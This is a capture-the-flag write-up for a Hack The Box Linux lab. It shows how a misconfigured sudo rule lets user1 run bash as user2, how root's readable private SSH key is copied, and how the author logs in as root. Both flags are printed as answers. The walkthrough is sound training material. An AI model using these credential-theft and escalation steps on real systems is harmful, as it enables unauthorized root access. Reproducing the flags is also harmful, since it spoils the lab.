
## **Overview**

- **Difficulty:** Easy
- **Operating System:** Linux
- **Objective:** Escalate privileges and capture the flag
- **Tools Used:** `nmap`, `metasploit`, `openvpn`, `searchsploit`

---
## **SSH'ing into the shell**

The very first thing is to obviously get into the system using ssh:
```
$ ssh user1@94.237.62.184 -p 39570
```
 
 Once in, let's first see what sudo permissions do I have using the `sudo -l` command:
 ```
 user1@ng-1634363-gettingstartedprivesc-mug0k-7db76f5c46-5n4mr:~$ sudo -l
Matching Defaults entries for user1 on ng-1634363-gettingstartedprivesc-mug0k-7db76f5c46-5n4mr:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user1 may run the following commands on ng-1634363-gettingstartedprivesc-mug0k-7db76f5c46-5n4mr:
    (user2 : user2) NOPASSWD: /bin/bash

```

This clearly shows that `user2` can execute commands for `/bin/bash` using sudo.
Our immediate next step should be to know what all can be done so, I come to https://gtfobins.github.io/gtfobins/bash/ and upon scrolling:
![[Pasted image 20250104122647.png]]

There's a clear trend that we can execute commands in the manner:
```
$ sudo -u user2 bash -c '<whatever>'
```

Let's go check it out.
```
user1@ng-1634363-gettingstartedprivesc-mug0k-7db76f5c46-5n4mr:~$ sudo -u user2 bash -c 'whoami'
user2
```

Yup, its working!
Let's start with exploring what all is visible upon first `ls`:
```
user1@ng-1634363-gettingstartedprivesc-mug0k-7db76f5c46-5n4mr:~$ sudo -u user2 bash -c 'ls /home'
user1  user2
user1@ng-1634363-gettingstartedprivesc-mug0k-7db76f5c46-5n4mr:~$ sudo -u user2 bash -c 'ls /home/user2'
flag.txt
user1@ng-1634363-gettingstartedprivesc-mug0k-7db76f5c46-5n4mr:~$ sudo -u user2 bash -c 'cat /home/user2/flag.txt'
HTB{l473r4l_m0v3m3n7_70_4n07h3r_u53r}
```

There's flag number 1:
A1: `HTB{l473r4l_m0v3m3n7_70_4n07h3r_u53r}`

Now, moving on I go through all directories similary and no exciting find.
Now, its time to get root privs, so I go to `/root/user/.ssh` to try and find a `id_rsa`, but first a little bs:
```
user1@ng-1634363-gettingstartedprivesc-mug0k-7db76f5c46-5n4mr:~$ sudo -u user2 bash -c 'ls -lash /root'
total 32K
4.0K drwxr-x--- 1 root user2 4.0K Feb 12  2021 .
4.0K drwxr-xr-x 1 root root  4.0K Jan  4 06:01 ..
4.0K -rwxr-x--- 1 root user2    5 Aug 19  2020 .bash_history
4.0K -rwxr-x--- 1 root user2 3.1K Dec  5  2019 .bashrc
4.0K -rwxr-x--- 1 root user2  161 Dec  5  2019 .profile
4.0K drwxr-x--- 1 root user2 4.0K Feb 12  2021 .ssh
4.0K -rwxr-x--- 1 root user2 1.3K Aug 19  2020 .viminfo
4.0K -rw------- 1 root root    33 Feb 12  2021 flag.txt
user1@ng-1634363-gettingstartedprivesc-mug0k-7db76f5c46-5n4mr:~$ sudo -u user2 bash -c 'cat /root/flag.txt'
cat: /root/flag.txt: Permission denied
```

Obviously, what was I expecting!
Moving over the bs, there's a `.ssh`, lets check it out:
```
user1@ng-1634363-gettingstartedprivesc-mug0k-7db76f5c46-5n4mr:~$ sudo -u user2 bash -c 'ls -lash /root/.ssh'
total 20K
4.0K drwxr-x--- 1 root user2 4.0K Feb 12  2021 .
4.0K drwxr-x--- 1 root user2 4.0K Feb 12  2021 ..
4.0K -rw------- 1 root root   571 Feb 12  2021 authorized_keys
4.0K -rw-r--r-- 1 root root  2.6K Feb 12  2021 id_rsa
4.0K -rw-r--r-- 1 root root   571 Feb 12  2021 id_rsa.pub
```

And, voila! We've located the `id_rsa`, let's quickly copy it.
Quick side note is, I copied and got it locally but it was not working at all! The most common issue with copying into your system is that if you use `vim` ofc and not `nano` to check it out, you see an extra spaces line at the bottom. Remove that.

Now, you're ready!
First, update permissions to only read write:
```
$ chmod 600 temp-rsa
```

Finally, moment of truth:
```
$ ssh root@94.237.62.184 -p 39570 -i temp-rsa 
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 6.1.0-10-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

root@ng-1634363-gettingstartedprivesc-mug0k-7db76f5c46-5n4mr:~#
```

And, voila! You've successfully escalated privs and are now `root`.
Upon searching within, I found the flag which is what we needed:
```
root@ng-1634363-gettingstartedprivesc-mug0k-7db76f5c46-5n4mr:~# ls
flag.txt
root@ng-1634363-gettingstartedprivesc-mug0k-7db76f5c46-5n4mr:~# cat flag.txt 
HTB{pr1v1l363_35c4l4710n_2_r007}
```

A2: `HTB{pr1v1l363_35c4l4710n_2_r007}`

---

**Prepared by Araiz Naqvi**